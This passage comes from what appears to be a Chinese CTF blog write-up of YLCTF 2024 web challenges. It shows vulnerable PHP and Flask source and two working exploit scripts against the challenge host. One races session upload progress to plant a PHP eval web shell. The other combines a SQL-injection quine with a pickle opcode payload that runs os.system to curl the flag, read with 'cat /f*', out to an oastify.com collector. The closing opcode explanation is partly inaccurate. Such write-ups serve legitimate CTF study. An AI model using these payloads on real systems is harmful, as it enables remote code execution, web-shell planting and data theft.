</span></span><span style=display:flex><span>        $sql <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SELECT p.*, u.username FROM posts p JOIN users u ON p.user_id = u.id ORDER BY p.created_at DESC LIMIT ?, ?&#34;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>db</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>($sql, [$offset, $limit]);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>uploadImage</span>($userId, $imageUrl) {
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        $filename <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>        $curl <span style=color:#f92672>=</span> <span style=color:#a6e22e>curl_init</span>();
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>curl_setopt</span> ($curl, <span style=color:#a6e22e>CURLOPT_URL</span>, $imageUrl);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>curl_setopt</span>($curl, <span style=color:#a6e22e>CURLOPT_RETURNTRANSFER</span>, <span style=color:#66d9ef>true</span>);
</span></span><span style=display:flex><span>        $imageContent <span style=color:#f92672>=</span> <span style=color:#a6e22e>curl_exec</span> ($curl);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>curl_close</span> ($curl);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/http|gopher|dict/i&#39;</span>,$imageUrl) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/php|&lt;\?|script/i&#39;</span>,$imageContent)){
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ($imageContent <span style=color:#f92672>!==</span> <span style=color:#66d9ef>false</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>strlen</span>($imageContent)<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>50</span>) {
</span></span><span style=display:flex><span>            $filename <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;profile_&#39;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>md5</span>($imageUrl) <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;.jpg&#39;</span>;
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>file_put_contents</span>(<span style=color:#e6db74>&#39;./uploads/&#39;</span> <span style=color:#f92672>.</span> $filename, $imageContent);
</span></span><span style=display:flex><span>        }<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;./uploads/&#34;</span> <span style=color:#f92672>.</span> $filename;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><code>Message.php</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Message</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $db;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__construct</span>($db) {
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>db</span> <span style=color:#f92672>=</span> $db;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>send</span>($fromUserId, $toUserId, $content) {
</span></span><span style=display:flex><span>        $sql <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;INSERT INTO messages (from_user_id, to_user_id, content) VALUES (?, ?, ?)&#34;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>db</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>($sql, [$fromUserId, $toUserId, $content]);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>getConversation</span>($user1Id, $user2Id, $page <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>, $limit <span style=color:#f92672>=</span> <span style=color:#ae81ff>20</span>) {
</span></span><span style=display:flex><span>        $offset <span style=color:#f92672>=</span> ($page <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> $limit;
</span></span><span style=display:flex><span>        $sql <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SELECT * FROM messages WHERE (from_user_id = ? AND to_user_id = ?) OR (from_user_id = ? AND to_user_id = ?) ORDER BY created_at DESC LIMIT ?, ?&#34;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>db</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>($sql, [$user1Id, $user2Id, $user2Id, $user1Id, $offset, $limit]);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>打包分析一下发现存储在一个文件夹跟进，发现有漏洞的地方是在post.php里，但是已经利用过了</p><p>在index.php里有</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>test</span>($id,$data){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>count</span>(<span style=color:#a6e22e>array_unique</span>(<span style=color:#a6e22e>str_split</span>($data))) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>7</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/[a-z0-9]/i&#39;</span>, $data)){
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>eval</span>($data);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p>可以打一个条件竞争进去</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>file:///etc/php/7.0/apache2/php.ini
</span></span></code></pre></div><p><img alt=fox loading=lazy src=/posts/ctf/ylctf2024/fox.png></p><p>然后上exp吧</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> io
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> threading
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sessid <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;orange&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>WRITE</span>(session):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>        f <span style=color:#f92672>=</span> io<span style=color:#f92672>.</span>BytesIO(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>1024</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>50</span>)
</span></span><span style=display:flex><span>        session<span style=color:#f92672>.</span>post(
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;http://challenge.yuanloo.com:27814/index.php&#39;</span>,
</span></span><span style=display:flex><span>            data<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;</span>: <span style=color:#e6db74>&#34;1</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>echo &#39;&lt;?php eval($_POST[a]);&#39;&gt;/var/www/html/uploads/shell.php</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>},
</span></span><span style=display:flex><span>            files<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#34;file&#34;</span>: (<span style=color:#e6db74>&#39;wi.txt&#39;</span>, f)},
</span></span><span style=display:flex><span>            cookies<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#39;PHPSESSID&#39;</span>: sessid}
</span></span><span style=display:flex><span>        )
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>READ</span>(session):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>        request <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>session()
</span></span><span style=display:flex><span>        data <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;action&#39;</span>: <span style=color:#e6db74>&#39;login&#39;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;username&#39;</span>: <span style=color:#e6db74>&#39;123&#39;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;password&#39;</span>: <span style=color:#e6db74>&#39;123&#39;</span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        request<span style=color:#f92672>.</span>post(<span style=color:#e6db74>&#34;http://challenge.yuanloo.com:27814/&#34;</span>, data<span style=color:#f92672>=</span>data)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        data <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;action&#39;</span>: <span style=color:#e6db74>&#39;download_message&#39;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;data&#39;</span>: <span style=color:#e6db74>&#39;`. /???/???/???/???/??????????????`;&#39;</span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        request<span style=color:#f92672>.</span>post(<span style=color:#e6db74>&#34;http://challenge.yuanloo.com:27814/&#34;</span>, data<span style=color:#f92672>=</span>data)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> requests<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;http://challenge.yuanloo.com:27814/uploads/shell.php&#34;</span>)<span style=color:#f92672>.</span>status_code <span style=color:#f92672>!=</span> <span style=color:#ae81ff>404</span>:
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>&#39;Success!&#39;</span>)
</span></span><span style=display:flex><span>            exit(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> requests<span style=color:#f92672>.</span>session() <span style=color:#66d9ef>as</span> session:
</span></span><span style=display:flex><span>    t1 <span style=color:#f92672>=</span> threading<span style=color:#f92672>.</span>Thread(target<span style=color:#f92672>=</span>WRITE, args<span style=color:#f92672>=</span>(session,))
</span></span><span style=display:flex><span>    t1<span style=color:#f92672>.</span>daemon <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>    t1<span style=color:#f92672>.</span>start()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    READ(session)
</span></span></code></pre></div><h5 id=round-2-snekly复现>[Round 2] SNEKLY(复现)</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask, render_template, request, jsonify
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> flask_login <span style=color:#f92672>import</span> LoginManager, UserMixin
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sqlite3
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> base64
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> pickle
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app<span style=color:#f92672>.</span>config[<span style=color:#e6db74>&#39;SECRET_KEY&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;060ac533d307&#39;</span>
</span></span><span style=display:flex><span>app<span style=color:#f92672>.</span>static_folder <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;static&#39;</span>
</span></span><span style=display:flex><span>login_manager <span style=color:#f92672>=</span> LoginManager()
</span></span><span style=display:flex><span>login_manager<span style=color:#f92672>.</span>init_app(app)
</span></span><span style=display:flex><span>login_manager<span style=color:#f92672>.</span>login_view <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;login&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>user <span style=color:#f92672>=</span> {}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>current_dir <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>dirname(os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>abspath(__file__))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>db_path <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>join(current_dir, <span style=color:#e6db74>&#39;data.db&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>User</span>(UserMixin):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__init__</span>(self, id, username, password_hash, data):
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>id <span style=color:#f92672>=</span> id
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>username <span style=color:#f92672>=</span> username
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>password_hash <span style=color:#f92672>=</span> password_hash
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>data <span style=color:#f92672>=</span> data
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@login_manager.user_loader</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>load_user</span>(user_id):
</span></span><span style=display:flex><span>    conn <span style=color:#f92672>=</span> sqlite3<span style=color:#f92672>.</span>connect(db_path)
</span></span><span style=display:flex><span>    cursor <span style=color:#f92672>=</span> conn<span style=color:#f92672>.</span>cursor()
</span></span><span style=display:flex><span>    cursor<span style=color:#f92672>.</span>execute(<span style=color:#e6db74>&#34;SELECT * FROM users WHERE id = ?&#34;</span>, (user_id,))
</span></span><span style=display:flex><span>    user_data <span style=color:#f92672>=</span> cursor<span style=color:#f92672>.</span>fetchone()
</span></span><span style=display:flex><span>    conn<span style=color:#f92672>.</span>close()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> user_data:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> User(id<span style=color:#f92672>=</span>user_data[<span style=color:#ae81ff>0</span>], username<span style=color:#f92672>=</span>user_data[<span style=color:#ae81ff>1</span>], password_hash<span style=color:#f92672>=</span>user_data[<span style=color:#ae81ff>2</span>], data<span style=color:#f92672>=</span>user_data[<span style=color:#ae81ff>3</span>])
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;login.html&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/login&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>login</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>global</span> user
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;POST&#34;</span>:
</span></span><span style=display:flex><span>        username <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;username&#39;</span>)
</span></span><span style=display:flex><span>        password <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;password&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> username <span style=color:#f92672>or</span> <span style=color:#f92672>not</span> password:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> jsonify({<span style=color:#e6db74>&#34;code&#34;</span>: <span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;msg&#34;</span>: <span style=color:#e6db74>&#34;用户名或密码不能为空&#34;</span>})
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>            con <span style=color:#f92672>=</span> sqlite3<span style=color:#f92672>.</span>connect(db_path)
</span></span><span style=display:flex><span>            cur <span style=color:#f92672>=</span> con<span style=color:#f92672>.</span>cursor()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            output <span style=color:#f92672>=</span> cur<span style=color:#f92672>.</span>execute(
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#39;SELECT * FROM users WHERE username = </span><span style=color:#e6db74>{post[username]!r}</span><span style=color:#e6db74> AND password = </span><span style=color:#e6db74>{post[password]!r}</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>                <span style=color:#f92672>.</span>format(post<span style=color:#f92672>=</span>request<span style=color:#f92672>.</span>form)
</span></span><span style=display:flex><span>            )<span style=color:#f92672>.</span>fetchone()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> output <span style=color:#f92672>is</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> jsonify({<span style=color:#e6db74>&#34;code&#34;</span>: <span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;msg&#34;</span>: <span style=color:#e6db74>&#34;用户名或密码错误&#34;</span>})
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            user[<span style=color:#e6db74>&#39;id&#39;</span>], user[<span style=color:#e6db74>&#39;username&#39;</span>], user[<span style=color:#e6db74>&#39;password&#39;</span>], user[<span style=color:#e6db74>&#39;data&#39;</span>] <span style=color:#f92672>=</span> output
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e># 使用安全的密码验证方法</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (user[<span style=color:#e6db74>&#39;username&#39;</span>] <span style=color:#f92672>==</span> username) <span style=color:#f92672>and</span> (user[<span style=color:#e6db74>&#39;password&#39;</span>] <span style=color:#f92672>==</span> password):
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> jsonify({<span style=color:#e6db74>&#34;code&#34;</span>: <span style=color:#ae81ff>0</span>, <span style=color:#e6db74>&#34;msg&#34;</span>: <span style=color:#e6db74>&#34;登录成功&#34;</span>})
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>                user <span style=color:#f92672>=</span> {}
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> jsonify({<span style=color:#e6db74>&#34;code&#34;</span>: <span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;msg&#34;</span>: <span style=color:#e6db74>&#34;用户名或密码错误&#34;</span>})
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> sqlite3<span style=color:#f92672>.</span>Error <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;数据库错误: </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> jsonify({<span style=color:#e6db74>&#34;code&#34;</span>: <span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;msg&#34;</span>: <span style=color:#e6db74>&#34;服务器错误，请稍后重试&#34;</span>})
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> jsonify({<span style=color:#e6db74>&#34;code&#34;</span>: <span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;msg&#34;</span>: <span style=color:#e6db74>&#34;无效的请求方法&#34;</span>})
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/unSer&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>unSer</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        data <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64decode(user[<span style=color:#e6db74>&#39;data&#39;</span>])
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> any(keyword <span style=color:#f92672>in</span> data <span style=color:#66d9ef>for</span> keyword <span style=color:#f92672>in</span> [<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;getattr&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;R&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;map&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;eval&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;exec&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;import&#39;</span>]):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>raise</span> pickle<span style=color:#f92672>.</span>UnpicklingError(<span style=color:#e6db74>&#34;unSer&#34;</span>)
</span></span><span style=display:flex><span>        pickle<span style=color:#f92672>.</span>loads(data)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>pass</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;unSer&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>run(host<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;0.0.0.0&#39;</span>)
</span></span></code></pre></div><p>看到有pickle的模块大抵应该是考察python的反序列化，定位一下关键代码</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>unSer</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        data <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64decode(user[<span style=color:#e6db74>&#39;data&#39;</span>])
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> any(keyword <span style=color:#f92672>in</span> data <span style=color:#66d9ef>for</span> keyword <span style=color:#f92672>in</span> [<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;getattr&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;R&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;map&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;eval&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;exec&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;import&#39;</span>]):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>raise</span> pickle<span style=color:#f92672>.</span>UnpicklingError(<span style=color:#e6db74>&#34;unSer&#34;</span>)
</span></span><span style=display:flex><span>        pickle<span style=color:#f92672>.</span>loads(data)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>pass</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;unSer&#34;</span>
</span></span></code></pre></div><p>使用bp打一个dnslog</p><pre tabindex=0><code>import base64
import requests


def quine(data):
    data = data.replace(&#39;$$&#39;, &#34;REPLACE(REPLACE(REPLACE($$,CHAR(39),CHAR(34)),CHAR(36),$$), CHAR(92), CHAR())&#34;)
    data1 = data.replace(&#34;&#39;&#34;, &#39;&#34;&#39;).replace(&#39;$$&#39;, &#34;&#39;$&#39;&#34;)
    data = data.replace(&#39;$$&#39;, f&#39;&#34;{data1}&#34;&#39;)
    return data


def exp():
    username = &#34;test\&#34;&#39;&#34;

    opcode = b&#39;&#39;&#39;c__builtin__
filter
p0
0(S&#39;curl http://`cat /f*`.urpybxuysw5jjp2ie3koqo4ia9g14rsg.oastify.com&#39;
tp1
0(cos
system
g1
tp2
0g0
g2
\x81p3
0c__builtin__
tuple
p4
(g3
t\x81.&#39;&#39;&#39;
    a = base64.b64encode(opcode).decode()
    res = &#39;&#39;
    for i in a:
        if ord(i) &gt; 58 or ord(i) &lt; 47:
            res += &#34;||CHAR(&#34; + str(ord(i)) + &#34;)&#34;
        else:
            res += &#34;||&#34; + i
    res = res[2:]

    password = f&#34; UNION SELECT $$, CHAR({&#39;,&#39;.join(str(ord(c)) for c in username)}), $$,({res});-- -&#34;
    password = quine(password)

    requests.post(url=&#34;http://challenge.yuanloo.com:29180/login&#34;,
                  data={
                      &#34;username&#34;: username,
                      &#34;password&#34;: password
                  })

    requests.get(url=&#34;http://challenge.yuanloo.com:29180/unSer&#34;)


if __name__ == &#34;__main__&#34;:
    exp()
</code></pre><p><img alt=SNEKLy loading=lazy src=/posts/ctf/ylctf2024/SNEKLy.png></p><p>学学opcode吧</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>开头的 c__builtin__：
</span></span><span style=display:flex><span>c 表示这个数据结构是一个类的调用。
</span></span><span style=display:flex><span><span style=font-weight:700>__builtin__</span> 是 Python 内置模块，意味着后续会调用该模块中的函数。
</span></span><span style=display:flex><span>filter 是内置函数，用于过滤序列。它将在后续的调用中被使用。
</span></span><span style=display:flex><span>p0 表示将后续的对象（0表示第一个对象）保存到位置 0。
</span></span><span style=display:flex><span>0(S&#39;curl http://... 是一个字符串对象，表示要执行的命令。
</span></span><span style=display:flex><span>这里的命令使用反引号执行 cat /f*，并将输出发送到指定的 URL。
</span></span><span style=display:flex><span>tp1 是另一个指令，用于标记后续的数据结构类型。
</span></span><span style=display:flex><span>0(cos 说明后续数据是与 cos 相关
</span></span><span style=display:flex><span>system 是 os 模块中的一个函数，用于执行系统命令。
</span></span><span style=display:flex><span>g1 用于获取在之前定义的对象，可能是一个函数的引用。
</span></span><span style=display:flex><span>tp2 标记下一个数据结构的类型。
</span></span><span style=display:flex><span>0g0 指获取第一个对象（即命令字符串）。
</span></span><span style=display:flex><span>g2 表示下一个对象的获取。
</span></span><span style=display:flex><span>\x81 是一个转义字符，用于处理特定的内部格式。
</span></span><span style=display:flex><span>p3 表示将此对象保存到位置 3。
</span></span><span style=display:flex><span>0c__builtin__ 和 tuple：
</span></span><span style=display:flex><span>这段是为了创建一个元组，包含前面定义的对象。
</span></span><span style=display:flex><span>最终的结构是一个包含 system 函数和命令的元组。
</span></span><span style=display:flex><span>p4 将这个元组保存在位置 4。
